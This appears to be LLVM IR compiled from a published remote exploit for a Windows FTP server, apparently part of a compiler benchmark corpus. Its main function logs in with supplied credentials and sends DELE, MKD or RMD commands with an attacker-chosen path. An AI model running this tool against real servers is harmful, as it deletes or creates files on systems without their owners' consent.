; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_8897.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_8897.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"[+]Connect to Server %s\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [18 x i8] c"[-]FAILED SOCKET\0A\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"-df\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"USER %s\0D\0A\00", align 1
@.str.4 = private unnamed_addr constant [32 x i8] c"[-]Send Request USER\09\09[FAILED]\0A\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"PASS %s\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [32 x i8] c"[-]Send Request PASS\09\09[FAILED]\0A\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"[+]>>%s\00", align 1
@.str.8 = private unnamed_addr constant [7 x i8] c"SYST\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [10 x i8] c"DELE %s\0D\0A\00", align 1
@.str.10 = private unnamed_addr constant [32 x i8] c"[-]Send Request DELE\09\09[FAILED]\0A\00", align 1
@.str.11 = private unnamed_addr constant [4 x i8] c"-cd\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"MKD %s\0D\0A\00", align 1
@.str.13 = private unnamed_addr constant [31 x i8] c"[-]Send Request MKD\09\09[FAILED]\0A\00", align 1
@.str.14 = private unnamed_addr constant [4 x i8] c"-dd\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"RMD %s\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [31 x i8] c"[-]Send Request RMD\09\09[FAILED]\0A\00", align 1
@.str.17 = private unnamed_addr constant [22 x i8] c"[-]Connect\09\09[FAILED]\0A\00", align 1
@.str.18 = private unnamed_addr constant [10 x i8] c"[+]Done!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca [50 x i8], align 16
  %13 = alloca [100 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 6
  br i1 %15, label %16, label %21

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @syntax(i8* %19)
  br label %21

21:                                               ; preds = %16, %2
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 2
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @atoi(i8* %24)
  store i32 %25, i32* %6, align 4
  store i32 12, i32* %10, align 4
  %26 = load i32, i32* @AF_INET, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %26, i32* %27, align 4
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @inet_addr(i8* %30)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %33 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %32, i32 0, i32 0
  store i32 %31, i32* %33, align 4
  %34 = load i32, i32* %6, align 4
  %35 = call i32 @htons(i32 %34)
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i32 %35, i32* %36, align 4
  %37 = load i32, i32* @stdout, align 4
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 (i32, i8*, ...) @fprintf(i32 %37, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0), i8* %40)
  %42 = load i32, i32* @AF_INET, align 4
  %43 = load i32, i32* @SOCK_STREAM, align 4
  %44 = call i32 @socket(i32 %42, i32 %43, i32 0)
  store i32 %44, i32* %8, align 4
  %45 = load i32, i32* %8, align 4
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %50

47:                                               ; preds = %21
  %48 = load i32, i32* @stderr, align 4
  %49 = call i32 (i32, i8*, ...) @fprintf(i32 %48, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %391

50:                                               ; preds = %21
  %51 = load i32, i32* %8, align 4
  %52 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @connect(i32 %51, %struct.sockaddr* %52, i32 %53)
  store i32 %54, i32* %9, align 4
  %55 = load i32, i32* %9, align 4
  %56 = icmp ne i32 %55, -1
  br i1 %56, label %57, label %378

57:                                               ; preds = %50
  %58 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %59 = call i32 @memset(i8* %58, i32 0, i32 100)
  %60 = load i32, i32* %8, align 4
  %61 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %62 = call i32 @recv(i32 %60, i8* %61, i32 100, i32 0)
  %63 = load i8**, i8*** %5, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 5
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 @strcmp(i8* %65, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0))
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %167, label %68

68:                                               ; preds = %57
  %69 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %70 = load i8**, i8*** %5, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 3
  %72 = load i8*, i8** %71, align 8
  %73 = call i32 (i8*, i8*, ...) @sprintf(i8* %69, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0), i8* %72)
  %74 = load i32, i32* %8, align 4
  %75 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %76 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %77 = call i32 @strlen(i8* %76)
  %78 = call i32 @send(i32 %74, i8* %75, i32 %77, i32 0)
  %79 = icmp eq i32 %78, -1
  br i1 %79, label %80, label %85

80:                                               ; preds = %68
  %81 = load i32, i32* @stderr, align 4
  %82 = call i32 (i32, i8*, ...) @fprintf(i32 %81, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0))
  %83 = load i32, i32* %8, align 4
  %84 = call i32 @shutdown(i32 %83, i32 1)
  store i32 1, i32* %3, align 4
  br label %391

85:                                               ; preds = %68
  %86 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %87 = call i32 @memset(i8* %86, i32 0, i32 100)
  %88 = load i32, i32* %8, align 4
  %89 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %90 = call i32 @recv(i32 %88, i8* %89, i32 100, i32 0)
  br label %91

91:                                               ; preds = %85
  %92 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %93 = load i8**, i8*** %5, align 8
  %94 = getelementptr inbounds i8*, i8** %93, i64 4
  %95 = load i8*, i8** %94, align 8
  %96 = call i32 (i8*, i8*, ...) @sprintf(i8* %92, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0), i8* %95)
  %97 = load i32, i32* %8, align 4
  %98 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %99 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %100 = call i32 @strlen(i8* %99)
  %101 = call i32 @send(i32 %97, i8* %98, i32 %100, i32 0)
  %102 = icmp eq i32 %101, -1
  br i1 %102, label %103, label %108

103:                                              ; preds = %91
  %104 = load i32, i32* @stderr, align 4
  %105 = call i32 (i32, i8*, ...) @fprintf(i32 %104, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0))
  %106 = load i32, i32* %8, align 4
  %107 = call i32 @shutdown(i32 %106, i32 1)
  store i32 1, i32* %3, align 4
  br label %391

108:                                              ; preds = %91
  %109 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %110 = call i32 @memset(i8* %109, i32 0, i32 100)
  %111 = load i32, i32* %8, align 4
  %112 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %113 = call i32 @recv(i32 %111, i8* %112, i32 100, i32 0)
  %114 = load i32, i32* @stdout, align 4
  %115 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %116 = call i32 (i32, i8*, ...) @fprintf(i32 %114, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i8* %115)
  br label %117

117:                                              ; preds = %108
  %118 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %119 = call i32 (i8*, i8*, ...) @sprintf(i8* %118, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  %120 = load i32, i32* %8, align 4
  %121 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %122 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %123 = call i32 @strlen(i8* %122)
  %124 = call i32 @send(i32 %120, i8* %121, i32 %123, i32 0)
  %125 = icmp eq i32 %124, -1
  br i1 %125, label %126, label %131

126:                                              ; preds = %117
  %127 = load i32, i32* @stderr, align 4
  %128 = call i32 (i32, i8*, ...) @fprintf(i32 %127, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0))
  %129 = load i32, i32* %8, align 4
  %130 = call i32 @shutdown(i32 %129, i32 1)
  store i32 1, i32* %3, align 4
  br label %391

131:                                              ; preds = %117
  %132 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %133 = call i32 @memset(i8* %132, i32 0, i32 100)
  %134 = load i32, i32* %8, align 4
  %135 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %136 = call i32 @recv(i32 %134, i8* %135, i32 100, i32 0)
  %137 = load i32, i32* @stdout, align 4
  %138 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %139 = call i32 (i32, i8*, ...) @fprintf(i32 %137, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i8* %138)
  br label %140

140:                                              ; preds = %131
  %141 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %142 = load i8**, i8*** %5, align 8
  %143 = getelementptr inbounds i8*, i8** %142, i64 6
  %144 = load i8*, i8** %143, align 8
  %145 = call i32 (i8*, i8*, ...) @sprintf(i8* %141, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i64 0, i64 0), i8* %144)
  %146 = load i32, i32* %8, align 4
  %147 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %148 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %149 = call i32 @strlen(i8* %148)
  %150 = call i32 @send(i32 %146, i8* %147, i32 %149, i32 0)
  %151 = icmp eq i32 %150, -1
  br i1 %151, label %152, label %157

152:                                              ; preds = %140
  %153 = load i32, i32* @stderr, align 4
  %154 = call i32 (i32, i8*, ...) @fprintf(i32 %153, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.10, i64 0, i64 0))
  %155 = load i32, i32* %8, align 4
  %156 = call i32 @shutdown(i32 %155, i32 1)
  store i32 1, i32* %3, align 4
  br label %391

157:                                              ; preds = %140
  %158 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %159 = call i32 @memset(i8* %158, i32 0, i32 100)
  %160 = load i32, i32* %8, align 4
  %161 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %162 = call i32 @recv(i32 %160, i8* %161, i32 100, i32 0)
  %163 = load i32, i32* @stdout, align 4
  %164 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %165 = call i32 (i32, i8*, ...) @fprintf(i32 %163, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i8* %164)
  br label %166

166:                                              ; preds = %157
  br label %167

167:                                              ; preds = %166, %57
  %168 = load i8**, i8*** %5, align 8
  %169 = getelementptr inbounds i8*, i8** %168, i64 5
  %170 = load i8*, i8** %169, align 8
  %171 = call i32 @strcmp(i8* %170, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.11, i64 0, i64 0))
  %172 = icmp ne i32 %171, 0
  br i1 %172, label %272, label %173

173:                                              ; preds = %167
  %174 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %175 = load i8**, i8*** %5, align 8
  %176 = getelementptr inbounds i8*, i8** %175, i64 3
  %177 = load i8*, i8** %176, align 8
  %178 = call i32 (i8*, i8*, ...) @sprintf(i8* %174, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0), i8* %177)
  %179 = load i32, i32* %8, align 4
  %180 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %181 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %182 = call i32 @strlen(i8* %181)
  %183 = call i32 @send(i32 %179, i8* %180, i32 %182, i32 0)
  %184 = icmp eq i32 %183, -1
  br i1 %184, label %185, label %190

185:                                              ; preds = %173
  %186 = load i32, i32* @stderr, align 4
  %187 = call i32 (i32, i8*, ...) @fprintf(i32 %186, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0))
  %188 = load i32, i32* %8, align 4
  %189 = call i32 @shutdown(i32 %188, i32 1)
  store i32 1, i32* %3, align 4
  br label %391

190:                                              ; preds = %173
  %191 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %192 = call i32 @memset(i8* %191, i32 0, i32 100)
  %193 = load i32, i32* %8, align 4
  %194 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %195 = call i32 @recv(i32 %193, i8* %194, i32 100, i32 0)
  br label %196

196:                                              ; preds = %190
  %197 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %198 = load i8**, i8*** %5, align 8
  %199 = getelementptr inbounds i8*, i8** %198, i64 4
  %200 = load i8*, i8** %199, align 8
  %201 = call i32 (i8*, i8*, ...) @sprintf(i8* %197, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0), i8* %200)
  %202 = load i32, i32* %8, align 4
  %203 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %204 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %205 = call i32 @strlen(i8* %204)
  %206 = call i32 @send(i32 %202, i8* %203, i32 %205, i32 0)
  %207 = icmp eq i32 %206, -1
  br i1 %207, label %208, label %213

208:                                              ; preds = %196
  %209 = load i32, i32* @stderr, align 4
  %210 = call i32 (i32, i8*, ...) @fprintf(i32 %209, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0))
  %211 = load i32, i32* %8, align 4
  %212 = call i32 @shutdown(i32 %211, i32 1)
  store i32 1, i32* %3, align 4
  br label %391

213:                                              ; preds = %196
  %214 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %215 = call i32 @memset(i8* %214, i32 0, i32 100)
  %216 = load i32, i32* %8, align 4
  %217 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %218 = call i32 @recv(i32 %216, i8* %217, i32 100, i32 0)
  %219 = load i32, i32* @stdout, align 4
  %220 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %221 = call i32 (i32, i8*, ...) @fprintf(i32 %219, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i8* %220)
  br label %222

222:                                              ; preds = %213
  %223 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %224 = call i32 (i8*, i8*, ...) @sprintf(i8* %223, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  %225 = load i32, i32* %8, align 4
  %226 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %227 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %228 = call i32 @strlen(i8* %227)
  %229 = call i32 @send(i32 %225, i8* %226, i32 %228, i32 0)
  %230 = icmp eq i32 %229, -1
  br i1 %230, label %231, label %236

231:                                              ; preds = %222
  %232 = load i32, i32* @stderr, align 4
  %233 = call i32 (i32, i8*, ...) @fprintf(i32 %232, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0))
  %234 = load i32, i32* %8, align 4
  %235 = call i32 @shutdown(i32 %234, i32 1)
  store i32 1, i32* %3, align 4
  br label %391

236:                                              ; preds = %222
  %237 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %238 = call i32 @memset(i8* %237, i32 0, i32 100)
  %239 = load i32, i32* %8, align 4
  %240 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %241 = call i32 @recv(i32 %239, i8* %240, i32 100, i32 0)
  %242 = load i32, i32* @stdout, align 4
  %243 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %244 = call i32 (i32, i8*, ...) @fprintf(i32 %242, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i8* %243)
  br label %245

245:                                              ; preds = %236
  %246 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %247 = load i8**, i8*** %5, align 8
  %248 = getelementptr inbounds i8*, i8** %247, i64 6
  %249 = load i8*, i8** %248, align 8
  %250 = call i32 (i8*, i8*, ...) @sprintf(i8* %246, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i64 0, i64 0), i8* %249)
  %251 = load i32, i32* %8, align 4
  %252 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %253 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %254 = call i32 @strlen(i8* %253)
  %255 = call i32 @send(i32 %251, i8* %252, i32 %254, i32 0)
  %256 = icmp eq i32 %255, -1
  br i1 %256, label %257, label %262

257:                                              ; preds = %245
  %258 = load i32, i32* @stderr, align 4
  %259 = call i32 (i32, i8*, ...) @fprintf(i32 %258, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.13, i64 0, i64 0))
  %260 = load i32, i32* %8, align 4
  %261 = call i32 @shutdown(i32 %260, i32 1)
  store i32 1, i32* %3, align 4
  br label %391

262:                                              ; preds = %245
  %263 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %264 = call i32 @memset(i8* %263, i32 0, i32 100)
  %265 = load i32, i32* %8, align 4
  %266 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %267 = call i32 @recv(i32 %265, i8* %266, i32 100, i32 0)
  %268 = load i32, i32* @stdout, align 4
  %269 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %270 = call i32 (i32, i8*, ...) @fprintf(i32 %268, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i8* %269)
  br label %271

271:                                              ; preds = %262
  br label %272

272:                                              ; preds = %271, %167
  %273 = load i8**, i8*** %5, align 8
  %274 = getelementptr inbounds i8*, i8** %273, i64 5
  %275 = load i8*, i8** %274, align 8
  %276 = call i32 @strcmp(i8* %275, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.14, i64 0, i64 0))
  %277 = icmp ne i32 %276, 0
  br i1 %277, label %377, label %278

278:                                              ; preds = %272
  %279 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %280 = load i8**, i8*** %5, align 8
  %281 = getelementptr inbounds i8*, i8** %280, i64 3
  %282 = load i8*, i8** %281, align 8
  %283 = call i32 (i8*, i8*, ...) @sprintf(i8* %279, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0), i8* %282)
  %284 = load i32, i32* %8, align 4
  %285 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %286 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %287 = call i32 @strlen(i8* %286)
  %288 = call i32 @send(i32 %284, i8* %285, i32 %287, i32 0)
  %289 = icmp eq i32 %288, -1
  br i1 %289, label %290, label %295

290:                                              ; preds = %278
  %291 = load i32, i32* @stderr, align 4
  %292 = call i32 (i32, i8*, ...) @fprintf(i32 %291, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0))
  %293 = load i32, i32* %8, align 4
  %294 = call i32 @shutdown(i32 %293, i32 1)
  store i32 1, i32* %3, align 4
  br label %391

295:                                              ; preds = %278
  %296 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %297 = call i32 @memset(i8* %296, i32 0, i32 100)
  %298 = load i32, i32* %8, align 4
  %299 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %300 = call i32 @recv(i32 %298, i8* %299, i32 100, i32 0)
  br label %301

301:                                              ; preds = %295
  %302 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %303 = load i8**, i8*** %5, align 8
  %304 = getelementptr inbounds i8*, i8** %303, i64 4
  %305 = load i8*, i8** %304, align 8
  %306 = call i32 (i8*, i8*, ...) @sprintf(i8* %302, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0), i8* %305)
  %307 = load i32, i32* %8, align 4
  %308 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %309 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %310 = call i32 @strlen(i8* %309)
  %311 = call i32 @send(i32 %307, i8* %308, i32 %310, i32 0)
  %312 = icmp eq i32 %311, -1
  br i1 %312, label %313, label %318

313:                                              ; preds = %301
  %314 = load i32, i32* @stderr, align 4
  %315 = call i32 (i32, i8*, ...) @fprintf(i32 %314, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0))
  %316 = load i32, i32* %8, align 4
  %317 = call i32 @shutdown(i32 %316, i32 1)
  store i32 1, i32* %3, align 4
  br label %391

318:                                              ; preds = %301
  %319 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %320 = call i32 @memset(i8* %319, i32 0, i32 100)
  %321 = load i32, i32* %8, align 4
  %322 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %323 = call i32 @recv(i32 %321, i8* %322, i32 100, i32 0)
  %324 = load i32, i32* @stdout, align 4
  %325 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %326 = call i32 (i32, i8*, ...) @fprintf(i32 %324, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i8* %325)
  br label %327

327:                                              ; preds = %318
  %328 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %329 = call i32 (i8*, i8*, ...) @sprintf(i8* %328, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  %330 = load i32, i32* %8, align 4
  %331 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %332 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %333 = call i32 @strlen(i8* %332)
  %334 = call i32 @send(i32 %330, i8* %331, i32 %333, i32 0)
  %335 = icmp eq i32 %334, -1
  br i1 %335, label %336, label %341

336:                                              ; preds = %327
  %337 = load i32, i32* @stderr, align 4
  %338 = call i32 (i32, i8*, ...) @fprintf(i32 %337, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0))
  %339 = load i32, i32* %8, align 4
  %340 = call i32 @shutdown(i32 %339, i32 1)
  store i32 1, i32* %3, align 4
  br label %391

341:                                              ; preds = %327
  %342 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %343 = call i32 @memset(i8* %342, i32 0, i32 100)
  %344 = load i32, i32* %8, align 4
  %345 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %346 = call i32 @recv(i32 %344, i8* %345, i32 100, i32 0)
  %347 = load i32, i32* @stdout, align 4
  %348 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %349 = call i32 (i32, i8*, ...) @fprintf(i32 %347, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i8* %348)
  br label %350

350:                                              ; preds = %341
  %351 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %352 = load i8**, i8*** %5, align 8
  %353 = getelementptr inbounds i8*, i8** %352, i64 6
  %354 = load i8*, i8** %353, align 8
  %355 = call i32 (i8*, i8*, ...) @sprintf(i8* %351, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i64 0, i64 0), i8* %354)
  %356 = load i32, i32* %8, align 4
  %357 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %358 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %359 = call i32 @strlen(i8* %358)
  %360 = call i32 @send(i32 %356, i8* %357, i32 %359, i32 0)
  %361 = icmp eq i32 %360, -1
  br i1 %361, label %362, label %367

362:                                              ; preds = %350
  %363 = load i32, i32* @stderr, align 4
  %364 = call i32 (i32, i8*, ...) @fprintf(i32 %363, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.16, i64 0, i64 0))
  %365 = load i32, i32* %8, align 4
  %366 = call i32 @shutdown(i32 %365, i32 1)
  store i32 1, i32* %3, align 4
  br label %391

367:                                              ; preds = %350
  %368 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %369 = call i32 @memset(i8* %368, i32 0, i32 100)
  %370 = load i32, i32* %8, align 4
  %371 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %372 = call i32 @recv(i32 %370, i8* %371, i32 100, i32 0)
  %373 = load i32, i32* @stdout, align 4
  %374 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %375 = call i32 (i32, i8*, ...) @fprintf(i32 %373, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i8* %374)
  br label %376

376:                                              ; preds = %367
  br label %377

377:                                              ; preds = %376, %272
  br label %383

378:                                              ; preds = %50
  %379 = load i32, i32* @stderr, align 4
  %380 = call i32 (i32, i8*, ...) @fprintf(i32 %379, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.17, i64 0, i64 0))
  %381 = load i32, i32* %8, align 4
  %382 = call i32 @shutdown(i32 %381, i32 1)
  store i32 1, i32* %3, align 4
  br label %391

383:                                              ; preds = %377
  %384 = load i32, i32* %8, align 4
  %385 = call i32 @shutdown(i32 %384, i32 1)
  %386 = load i32, i32* @stdout, align 4
  %387 = load i8**, i8*** %5, align 8
  %388 = getelementptr inbounds i8*, i8** %387, i64 5
  %389 = load i8*, i8** %388, align 8
  %390 = call i32 (i32, i8*, ...) @fprintf(i32 %386, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i64 0, i64 0), i8* %389)
  store i32 0, i32* %3, align 4
  br label %391

391:                                              ; preds = %383, %378, %362, %336, %313, %290, %257, %231, %208, %185, %152, %126, %103, %80, %47
  %392 = load i32, i32* %3, align 4
  ret i32 %392
}

declare dso_local i32 @syntax(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @shutdown(i32, i32) #1

